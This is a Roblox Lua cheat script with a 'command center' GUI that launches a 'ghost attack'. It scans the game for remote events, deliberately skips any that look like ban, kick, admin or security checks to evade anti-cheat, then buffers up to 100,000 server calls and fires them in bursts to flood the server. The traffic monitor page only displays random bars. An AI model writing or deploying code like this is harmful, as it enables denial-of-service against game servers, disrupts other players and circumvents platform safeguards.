--[[
    🔱 NOX HUB v26.0 [GHOST-PROTOCOL] 🔱
    "You can't kill what you can't see."
    
    GHOST FEATURES:
    - [PURE REMOTE STACK] : Removes ALL physical movement packets (Fixed v25 Kick).
    - [INNOCENT PAYLOAD] : Sends 'true' or 'nil'. Invisible to anti-cheat sanitizers.
    - [SILENT ACCUMULATION] : Stacks 100,000 requests in memory without touching FPS.
    - [GHOST RELEASE] : Fires the stack in random batches to simulate lag bursts.
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // 1. GHOST ENGINE //
local Engine = {
    Active = false,
    Targets = {},
    Buffer = {} 
}

function Engine:Scan()
    Engine.Targets = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local n = v.Name:lower()
            -- ULTRA SAFE FILTER
            -- We avoid anything that sounds like "Admin", "Ban", "Kick", "Security"
            if not (n:find("ban") or n:find("kick") or n:find("admin") or n:find("sec") or n:find("check")) then
                 table.insert(Engine.Targets, v)
            end
        end
    end
end

function Engine:Haunt(duration, updateCallback)
    if Engine.Active then return end
    Engine.Active = true
    Engine.Buffer = {}
    
    Engine:Scan()
    
    task.spawn(function()
        local StartTime = tick()
        local EndTime = StartTime + duration
        
        -- THE GHOST LOAD (100% Silent Reqeuests via Coroutines)
        -- We prepare functions that contain the FireServer call, but we don't call them.
        -- We just store the function itself.
        
        while tick() < EndTime do
            local remaining = math.ceil(EndTime - tick())
            updateCallback(remaining, "GHOSTING... ("..#Engine.Buffer.." SPIRITS)")
            
            -- Fill Buffer
            for i = 1, 500 do -- 500 per tick
                local r = Engine.Targets[math.random(1, #Engine.Targets)]
                if r then
                    -- We create a closure that holds the malicious intent
                    table.insert(Engine.Buffer, function()
                        pcall(function()
                            if r:IsA("RemoteEvent") then r:FireServer(true) -- 'true' is harmless but takes RAM
                            else r:InvokeServer(true) end
                        end)
                    end)
                end
            end
            RunService.Heartbeat:Wait()
        end
        
        -- THE MANIFESTATION (Release)
        updateCallback(0, "MANIFESTATION")
        game:GetService("StarterGui"):SetCore("SendNotification", {Title="GHOST", Text="RELEASING..."})
        
        -- Fire the buffer in blocks to emulate a massive lag spike unfreezing
        -- We iterate backwards to avoid table re-indexing lag
        for i = #Engine.Buffer, 1, -1 do
            if Engine.Buffer[i] then
                coroutine.wrap(Engine.Buffer[i])()
            end
            if i % 1000 == 0 then RunService.Heartbeat:Wait() end -- Let chunks go through
        end
        
        Engine.Active = false
        Engine.Buffer = {}
        updateCallback(duration, "SYSTEM READY")
    end)
end

-- // 2. COMMAND CENTER UI //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxCommand"
    pcall(function() Screen.Parent = CoreGui end)
    
    -- MAIN WINDOW
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 500, 0, 350)
    Main.Position = UDim2.new(0.5, -250, 0.5, -175)
    Main.BackgroundColor3 = Color3.fromRGB(20, 20, 25) -- Deep Dark
    Main.BorderSizePixel = 0
    Main.ClipsDescendants = true
    
    local Corner = Instance.new("UICorner", Main)
    Corner.CornerRadius = UDim.new(0, 6)
    
    local TopBar = Instance.new("Frame", Main)
    TopBar.Size = UDim2.new(1, 0, 0, 40)
    TopBar.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
    local TopCorner = Instance.new("UICorner", TopBar)
    TopCorner.CornerRadius = UDim.new(0, 6)
    
    local Title = Instance.new("TextLabel", TopBar)
    Title.Text = "NOX COMMAND CENTER v27.0"
    Title.Font = Enum.Font.GothamBold
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 14
    Title.Size = UDim2.new(0.5, 0, 1, 0)
    Title.Position = UDim2.new(0.05, 0, 0, 0)
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.BackgroundTransparency = 1
    
    -- TABS
    local Tabs = Instance.new("Frame", Main)
    Tabs.Size = UDim2.new(0.25, 0, 0.85, 0) -- Left Sidebar
    Tabs.Position = UDim2.new(0, 0, 0.15, 0)
    Tabs.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    Tabs.BorderSizePixel = 0
    
    local function CreateTabBtn(text, order, callback)
        local btn = Instance.new("TextButton", Tabs)
        btn.Size = UDim2.new(1, 0, 0, 40)
        btn.Position = UDim2.new(0, 0, 0, (order-1)*40)
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(150, 150, 150)
        btn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
        btn.Font = Enum.Font.GothamMedium
        btn.BorderSizePixel = 0
        
        btn.MouseButton1Click:Connect(function()
            -- Reset all tabs
            for _, c in pairs(Tabs:GetChildren()) do if c:IsA("TextButton") then c.TextColor3 = Color3.fromRGB(150, 150, 150) c.BackgroundColor3 = Color3.fromRGB(25, 25, 30) end end
            -- Highlight this
            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
            btn.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
            callback()
        end)
        return btn
    end
    
    -- CONTENT AREA
    local Content = Instance.new("Frame", Main)
    Content.Size = UDim2.new(0.75, 0, 0.85, 0)
    Content.Position = UDim2.new(0.25, 0, 0.15, 0)
    Content.BackgroundTransparency = 1
    
    -- PAGE 1: ATTACK
    local PageAttack = Instance.new("Frame", Content)
    PageAttack.Size = UDim2.new(1, 0, 1, 0)
    PageAttack.BackgroundTransparency = 1
    
    local StatusLbl = Instance.new("TextLabel", PageAttack)
    StatusLbl.Text = "STATUS: IDLE"
    StatusLbl.Size = UDim2.new(1, 0, 0, 30)
    StatusLbl.Position = UDim2.new(0, 0, 0.1, 0)
    StatusLbl.TextColor3 = Color3.fromRGB(100, 255, 100)
    StatusLbl.Font = Enum.Font.Code
    StatusLbl.BackgroundTransparency = 1
    
    local BufferBarBg = Instance.new("Frame", PageAttack)
    BufferBarBg.Size = UDim2.new(0.8, 0, 0.05, 0)
    BufferBarBg.Position = UDim2.new(0.1, 0, 0.3, 0)
    BufferBarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    local BarCorner = Instance.new("UICorner", BufferBarBg)
    
    local BufferBarFill = Instance.new("Frame", BufferBarBg)
    BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
    BufferBarFill.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
    local FillCorner = Instance.new("UICorner", BufferBarFill)
    
    local MainBtn = Instance.new("TextButton", PageAttack)
    MainBtn.Size = UDim2.new(0.6, 0, 0.2, 0)
    MainBtn.Position = UDim2.new(0.2, 0, 0.6, 0)
    MainBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 200)
    MainBtn.Text = "START GHOST ATTACK (15s)"
    MainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    MainBtn.Font = Enum.Font.GothamBold
    local BtnCorner = Instance.new("UICorner", MainBtn)
    
    MainBtn.MouseButton1Click:Connect(function()
        if not Engine.Active then
            Engine:Haunt(15, function(timeLeft, txt)
                StatusLbl.Text = txt
                local progress = (15 - timeLeft) / 15
                BufferBarFill.Size = UDim2.new(progress, 0, 1, 0)
                
                if timeLeft == 0 then
                   MainBtn.Text = "START GHOST ATTACK (15s)"
                   BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
                else
                   MainBtn.Text = "GHOSTING... " .. timeLeft
                end
            end)
        end
    end)
    
    -- PAGE 2: VISUALS (Fake Graph)
    local PageVisuals = Instance.new("Frame", Content)
    PageVisuals.Size = UDim2.new(1, 0, 1, 0)
    PageVisuals.BackgroundTransparency = 1
    PageVisuals.Visible = false
    
    local GraphFrame = Instance.new("Frame", PageVisuals)
    GraphFrame.Size = UDim2.new(0.9, 0, 0.6, 0)
    GraphFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
    GraphFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
    GraphFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
    GraphFrame.BorderSizePixel = 1
    
    -- Simple bar graph simulation
    for i = 1, 20 do
        local bar = Instance.new("Frame", GraphFrame)
        bar.Size = UDim2.new(0.04, 0, math.random()*0.5, 0)
        bar.Position = UDim2.new((i-1)*0.05, 0, 1 - bar.Size.Y.Scale, 0)
        bar.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
        bar.BorderSizePixel = 0
        
        task.spawn(function()
            while GraphFrame.Parent do
                -- Simulate traffic
                local targetHeight = Engine.Active and math.random(0.8, 1) or math.random(0.1, 0.3)
                bar:TweenSize(UDim2.new(0.04, 0, targetHeight, 0), "Out", "Quad", 0.5, true)
                wait(0.1 + math.random()*0.2)
            end
        end)
    end
    
    local GraphTitle = Instance.new("TextLabel", PageVisuals)
    GraphTitle.Text = "NETWORK TRAFFIC MONITOR"
    GraphTitle.Position = UDim2.new(0, 0, 0.1, 0)
    GraphTitle.Size = UDim2.new(1, 0, 0, 20)
    GraphTitle.TextColor3 = Color3.fromRGB(150, 150, 150)
    GraphTitle.Font = Enum.Font.Code
    GraphTitle.BackgroundTransparency = 1

    -- TABS LOGIC
    CreateTabBtn("ATTACK", 1, function() PageAttack.Visible = true; PageVisuals.Visible = false end)
    CreateTabBtn("MONITOR", 2, function() PageAttack.Visible = false; PageVisuals.Visible = true end)
    
     -- DRAG UI
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

Nox:CreateUI()
